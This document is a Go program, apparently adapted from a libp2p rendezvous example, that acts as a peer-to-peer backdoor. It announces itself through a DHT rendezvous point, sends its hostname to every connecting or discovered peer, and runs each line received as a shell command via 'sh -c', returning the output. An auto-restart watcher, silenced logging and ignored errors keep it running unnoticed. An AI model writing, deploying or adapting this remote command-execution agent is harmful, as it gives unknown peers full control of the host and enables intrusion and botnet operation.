package main

import (
    "bufio"
    "context"
    "os"
    "fmt"
    "sync"
    "os/exec"
    "strings"

    "github.com/slayer/autorestart"
    "github.com/libp2p/go-libp2p"
    "github.com/libp2p/go-libp2p-core/network"
    "github.com/libp2p/go-libp2p-core/peer"
    "github.com/libp2p/go-libp2p-core/protocol"
    "github.com/libp2p/go-libp2p-discovery"

    dht "github.com/libp2p/go-libp2p-kad-dht"
    multiaddr "github.com/multiformats/go-multiaddr"
    //logging "github.com/whyrusleeping/go-logging"

    //"github.com/ipfs/go-log"
)

//var logger = log.Logger("rendezvous")

func getHostname() string {

    name, err := os.Hostname()
    if err != nil {
        panic(err)
    }
    fmt.Printf("%s", name)
    return name
}

func handleStream(stream network.Stream) {
    //logger.Info("Got a new stream!")

    // Create a buffer stream for non blocking read and write.
    rw := bufio.NewReadWriter(bufio.NewReader(stream), bufio.NewWriter(stream))

    go readData(rw)
    //go writeData(rw)

    // 'stream' will stay open until you close it (or the other side closes it).
}


func readData(rw *bufio.ReadWriter) {
    
    id := getHostname()

    rw.WriteString(fmt.Sprintf("%s:\n", id))
    rw.Flush()

    for {
        str, err := rw.ReadString('\n')
        if err != nil {
            fmt.Println("Error reading from buffer")
            break
        }else {
            text := strings.TrimSuffix(str, "\n")
            
            out, err := exec.Command("sh","-c", text).Output()
            if err != nil {
              fmt.Printf("error")
            fmt.Printf("%s", err)
            }
            output := string(out)
            _, err = rw.WriteString(fmt.Sprintf("%s", output))
            err = rw.Flush()
        }

    }
}



func main() {
    autorestart.StartWatcher()
    //log.SetAllLoggers(logging.CRITICAL)
    //log.SetLogLevel("rendezvous", "critical")
    //help := flag.Bool("h", false, "Display Help")
    config, err := ParseFlags()
    if err != nil {
        //panic(err)
    }



    ctx := context.Background()

    // libp2p.New constructs a new libp2p Host. Other options can be added
    // here.
    host, err := libp2p.New(ctx,
        libp2p.NATPortMap(),
        libp2p.ListenAddrs([]multiaddr.Multiaddr(config.ListenAddresses)...),
    )
    if err != nil {
        //panic(err)
    }
    //logger.Info("Host created. We are:", host.ID())
    //logger.Info(host.Addrs())

    // Set a function as stream handler. This function is called when a peer
    // initiates a connection and starts a stream with this peer.
    host.SetStreamHandler(protocol.ID(config.ProtocolID), handleStream)

    // Start a DHT, for use in peer discovery. We can't just make a new DHT
    // client because we want each peer to maintain its own local copy of the
    // DHT, so that the bootstrapping node of the DHT can go down without
    // inhibiting future peer discovery.
    kademliaDHT, err := dht.New(ctx, host)
    if err != nil {
        //panic(err)
    }

    // Bootstrap the DHT. In the default configuration, this spawns a Background
    // thread that will refresh the peer table every five minutes.
    //logger.Debug("Bootstrapping the DHT")
    if err = kademliaDHT.Bootstrap(ctx); err != nil {
        //panic(err)
    }

    // Let's connect to the bootstrap nodes first. They will tell us about the
    // other nodes in the network.
    var wg sync.WaitGroup
    for _, peerAddr := range config.BootstrapPeers {
        peerinfo, _ := peer.AddrInfoFromP2pAddr(peerAddr)
        wg.Add(1)
        go func() {
            defer wg.Done()
            if err := host.Connect(ctx, *peerinfo); err != nil {
                //logger.Warning(err)
            } else {
                //logger.Info("Connection established with bootstrap node:", *peerinfo)
            }
        }()
    }
    wg.Wait()

    // We use a rendezvous point "meet me here" to announce our location.
    // This is like telling your friends to meet you at the Eiffel Tower.
    //logger.Info("Announcing ourselves...")
    routingDiscovery := discovery.NewRoutingDiscovery(kademliaDHT)
    discovery.Advertise(ctx, routingDiscovery, config.RendezvousString)
    //logger.Debug("Successfully announced!")

    // Now, look for others who have announced
    // This is like your friend telling you the location to meet you.
    //logger.Debug("Searching for other peers...")
    peerChan, err := routingDiscovery.FindPeers(ctx, config.RendezvousString)
    if err != nil {
        //panic(err)
    }

    for peer := range peerChan {
        if peer.ID == host.ID() {
            continue
        }
        //logger.Debug("Found peer:", peer)

        //logger.Debug("Connecting to:", peer)
        stream, err := host.NewStream(ctx, peer.ID, protocol.ID(config.ProtocolID))

        if err != nil {
            //logger.Warning("Connection failed:", err)
            continue
        } else {
            rw := bufio.NewReadWriter(bufio.NewReader(stream), bufio.NewWriter(stream))

            //go writeData(rw)
            go readData(rw)
        }

        //logger.Info("Connected to:", peer)
    }

    select {}
}
